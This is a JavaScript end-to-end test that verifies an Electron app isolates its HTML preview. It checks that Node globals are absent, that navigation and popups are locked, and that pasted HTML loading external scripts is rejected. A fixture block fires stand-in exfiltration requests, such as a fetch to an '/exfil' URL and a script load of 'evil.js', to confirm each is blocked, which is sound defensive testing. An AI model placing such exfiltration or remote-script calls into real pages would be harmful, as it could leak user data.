import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";
import { IPC_CHANNELS } from "../../dist/shared/previewContracts.js";
import { registerStudioIpcHandlers } from "../../dist/main/ipc/studioIpcHandler.js";
import { PreviewContainerManager } from "../../dist/main/preview/previewContainerManager.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const repoRoot = path.resolve(__dirname, "..", "..");
const workRoot = path.join(repoRoot, "tmp", "sprint2-e2e");

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

function stageOfflinePreviewFixture(stageDir, { withDynamicJsAttack = false } = {}) {
  fs.rmSync(stageDir, { recursive: true, force: true });
  fs.mkdirSync(path.join(stageDir, "assets"), { recursive: true });
  fs.copyFileSync(
    path.join(repoRoot, "poc", "hyperframes-spike", "assets", "gsap.min.js"),
    path.join(stageDir, "assets", "gsap.min.js")
  );
  fs.writeFileSync(
    path.join(stageDir, "assets", "badge.svg"),
    `<svg xmlns="http://www.w3.org/2000/svg" width="80" height="80"><rect width="80" height="80" fill="#38bdf8"/></svg>`
  );

  const dynamicJsBlock = withDynamicJsAttack
    ? `
      window.__dynResults = { fetchBlocked: false, xhrBlocked: false, wsBlocked: false, imgBlocked: false, scriptBlocked: false };
      fetch("https://example.com/exfil").catch(() => { window.__dynResults.fetchBlocked = true; });
      try {
        const xhr = new XMLHttpRequest();
        xhr.open("GET", "https://example.com/xhr");
        xhr.onerror = () => { window.__dynResults.xhrBlocked = true; };
        xhr.send();
      } catch { window.__dynResults.xhrBlocked = true; }
      try {
        const ws = new WebSocket("wss://example.com/socket");
        ws.onerror = () => { window.__dynResults.wsBlocked = true; };
      } catch { window.__dynResults.wsBlocked = true; }
      const dImg = document.createElement("img");
      dImg.onerror = () => { window.__dynResults.imgBlocked = true; };
      dImg.src = "https://example.com/dyn.png";
      document.body.appendChild(dImg);
      const dScr = document.createElement("script");
      dScr.onerror = () => { window.__dynResults.scriptBlocked = true; };
      dScr.src = "https://cdn.example.com/evil.js";
      document.head.appendChild(dScr);
    `
    : "";

  const html = `<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <style>
    html, body { margin: 0; width: 1280px; height: 720px; background: #0f172a; overflow: hidden; }
    #box { position: absolute; left: 40px; top: 300px; width: 120px; height: 120px; background: #22d3ee; }
  </style>
  <script src="./assets/gsap.min.js"></script>
</head>
<body>
  <div id="root" data-composition-id="main" data-start="0" data-duration="3" data-width="1280" data-height="720" data-fps="30">
    <img id="logo" src="./assets/badge.svg" />
    <div id="box"></div>
  </div>
  <script>
    window.__timelines = window.__timelines || {};
    const tl = gsap.timeline({ paused: true });
    tl.to("#box", { x: 600, duration: 3, ease: "none" }, 0);
    window.__timelines["main"] = tl;
    ${dynamicJsBlock}
  </script>
</body>
</html>`;
  fs.writeFileSync(path.join(stageDir, "index.html"), html, "utf8");
}

export async function runElectronVerification({ BrowserWindow, RenderCoordinator, PINNED_RUNTIME }) {
  fs.rmSync(workRoot, { recursive: true, force: true });
  fs.mkdirSync(workRoot, { recursive: true });

  const violations = [];
  const previewManager = new PreviewContainerManager((ev) => {
    violations.push(ev);
  });
  const coordinator = new RenderCoordinator();

  const studioHtmlPath = path.join(repoRoot, "src", "renderer", "index.html");
  const studioOrigin = pathToFileURL(studioHtmlPath).href;
  const preloadPath = path.join(repoRoot, "dist", "preload", "studioPreload.cjs");

  const studioWin = new BrowserWindow({
    width: 1280,
    height: 780,
    show: false,
    webPreferences: {
      preload: preloadPath,
      nodeIntegration: false,
      contextIsolation: true,
      sandbox: true,
      webSecurity: true,
      allowRunningInsecureContent: false,
    },
  });

  studioWin.webContents.on("preload-error", (_ev, preloadFile, error) => {
    console.error("STUDIO PRELOAD ERROR:", preloadFile, error);
  });
  studioWin.webContents.on("console-message", (_ev, level, msg) => {
    if (level >= 2) console.error("STUDIO CONSOLE:", msg);
  });

  previewManager.attachHostWindow(studioWin);
  const ipcCtrl = registerStudioIpcHandlers(studioWin, studioOrigin, previewManager, coordinator);
  await studioWin.loadFile(studioHtmlPath);

  const report = {
    pinnedRuntime: PINNED_RUNTIME,
    timestamp: new Date().toISOString(),
    tests: {},
  };

  // T2-1: Studio UI Preload boundary & isolated HTML load via mf-asset://
  {
    const studioGlobals = await studioWin.webContents.executeJavaScript(`({
      hasMfStudio: typeof window.mfStudio === "object",
      hasRequire: typeof window.require !== "undefined",
      hasProcess: typeof window.process !== "undefined"
    })`);
    assert.equal(studioGlobals.hasMfStudio, true);
    assert.equal(studioGlobals.hasRequire, false);
    assert.equal(studioGlobals.hasProcess, false);

    const stage1 = path.join(workRoot, "t2-stage-local");
    stageOfflinePreviewFixture(stage1, { withDynamicJsAttack: true });
    const opened = await previewManager.openVerifiedDirectory(stage1, { title: "Local Offline Test" });
    assert.equal(opened.ok, true);

    await sleep(600);
    const active = previewManager.getActiveSession();
    assert.ok(active, "Preview session should be active");

    // Verify Preview renderer isolation (zero Node, zero preload)
    const previewGlobals = await active.view.webContents.executeJavaScript(`({
      origin: window.origin,
      href: window.location.href,
      typeofRequire: typeof require,
      typeofProcess: typeof process,
      typeofBuffer: typeof Buffer,
      typeofMfStudio: typeof window.mfStudio,
      typeofElectron: typeof window.electron,
      logoComplete: document.getElementById("logo")?.complete && document.getElementById("logo")?.naturalWidth === 80,
      hasGsap: typeof window.gsap === "object",
      dynResults: window.__dynResults
    })`);

    assert.equal(previewGlobals.origin, opened.session.origin);
    assert.equal(previewGlobals.typeofRequire, "undefined");
    assert.equal(previewGlobals.typeofProcess, "undefined");
    assert.equal(previewGlobals.typeofBuffer, "undefined");
    assert.equal(previewGlobals.typeofMfStudio, "undefined");
    assert.equal(previewGlobals.typeofElectron, "undefined");
    assert.equal(previewGlobals.logoComplete, true);
    assert.equal(previewGlobals.hasGsap, true);
    assert.equal(previewGlobals.dynResults.fetchBlocked, true);
    assert.equal(previewGlobals.dynResults.wsBlocked, true);
    assert.equal(previewGlobals.dynResults.imgBlocked, true);
    assert.equal(previewGlobals.dynResults.scriptBlocked, true);

    report.tests.previewIsolationAndDynamicNetworkGate = {
      passed: true,
      studioGlobals,
      previewGlobals,
      violationCountRecorded: violations.length,
    };
  }

  // T2-2: Navigation guard (will-navigate / popup / webRequest mainFrame) + Timeline Seek via Studio IPC
  {
    const active = previewManager.getActiveSession();
    assert.ok(active);
    const beforeUrl = active.view.webContents.getURL();

    await active.view.webContents.executeJavaScript(`(() => {
      window.open("https://example.com/popup", "_blank");
      const a = document.createElement("a");
      a.href = "https://example.com/escape";
      document.body.appendChild(a);
      a.click();
    })()`);
    await sleep(300);

    assert.equal(active.view.webContents.getURL(), beforeUrl, "Navigation must remain locked on entry HTML");
    assert.ok(violations.some((v) => v.source === "popup"), "Expected popup violation");
    assert.ok(violations.some((v) => v.source === "navigation" || v.source === "webRequest"));

    // Drive real IPC seek through Studio UI preload -> Main -> Preview WebContentsView
    const seekRes = await studioWin.webContents.executeJavaScript(
      `window.mfStudio.seekPreview(${JSON.stringify(active.sessionId)}, 1.5)`
    );
    assert.equal(seekRes.seekSupported, true);
    assert.equal(seekRes.currentTimeSec, 1.5);

    const boxTransform = await active.view.webContents.executeJavaScript(
      `getComputedStyle(document.getElementById("box")).transform`
    );
    assert.ok(boxTransform && boxTransform !== "none", "Expected GSAP transform at t=1.5s");

    report.tests.navigationPopupLockAndIpcSeek = {
      passed: true,
      lockedUrl: active.view.webContents.getURL(),
      seekRes,
      boxTransform,
      violationSources: Array.from(new Set(violations.map((v) => v.source))),
    };
  }

  // T2-3: Studio UI IPC loadPastedHtml + Preflight rejection + Main-owned MP4 render smoke check
  {
    const badPaste = await studioWin.webContents.executeJavaScript(`
      window.mfStudio.loadPastedHtml('<html><head><script src="https://cdn.example.com/x.js"></script></head><body></body></html>', 'BadPaste')
    `);
    assert.equal(badPaste.ok, false);
    assert.ok(badPaste.preflight.blockers.some((b) => b.code === "EXTERNAL_NETWORK_DISALLOWED"));

    const goodHtml = `<!doctype html><html><head><style>
      html,body{margin:0;width:640px;height:360px;background:#09111f;overflow:hidden}
      #bx{position:absolute;left:20px;top:120px;width:80px;height:80px;background:#38bdf8}
      </style></head><body>
      <div id="root" data-composition-id="main" data-start="0" data-duration="1" data-width="640" data-height="360" data-fps="30">
        <div id="bx"></div>
      </div>
      <script>
        // Also probe runtime dynamic external fetch inside export to confirm CSP meta gate blocks without failing render
        window.__dynNetBlocked = false;
        fetch("https://example.com/export-probe").catch(() => { window.__dynNetBlocked = true; });
        window.__timelines = { main: { duration: () => 1, seek: (t) => { document.getElementById("bx").style.transform = "translateX(" + (t * 200) + "px)"; } } };
      </script></body></html>`;

    const goodPaste = await studioWin.webContents.executeJavaScript(
      `window.mfStudio.loadPastedHtml(${JSON.stringify(goodHtml)}, 'GoodPaste')`
    );
    assert.equal(goodPaste.ok, true);
    assert.ok(goodPaste.session.entryUrl.startsWith("mf-asset://"));

    const renderRes = await studioWin.webContents.executeJavaScript(
      `window.mfStudio.startSessionRender({ sessionId: ${JSON.stringify(goodPaste.session.sessionId)}, format: "mp4", quality: "draft" })`
    );
    assert.equal(renderRes.status, "complete");
    assert.equal(fs.existsSync(renderRes.outputPath), true);

    report.tests.studioIpcPasteAndExportCsp = {
      passed: true,
      badPasteBlockedCodes: badPaste.preflight.blockers.map((b) => b.code),
      goodPasteOrigin: goodPaste.session.origin,
      exportStatus: renderRes.status,
      exportOutputExists: fs.existsSync(renderRes.outputPath),
      exportWallMs: renderRes.wallMs,
    };
  }

  await ipcCtrl.dispose();
  await coordinator.shutdown();
  studioWin.destroy();

  const reportOut = path.join(workRoot, "sprint2_verification_report.json");
  fs.writeFileSync(reportOut, JSON.stringify(report, null, 2));
  console.log("=== SPRINT 2 SECURE PREVIEW E2E PASSED ===");
  console.log(JSON.stringify(report, null, 2));
  return 0;
}
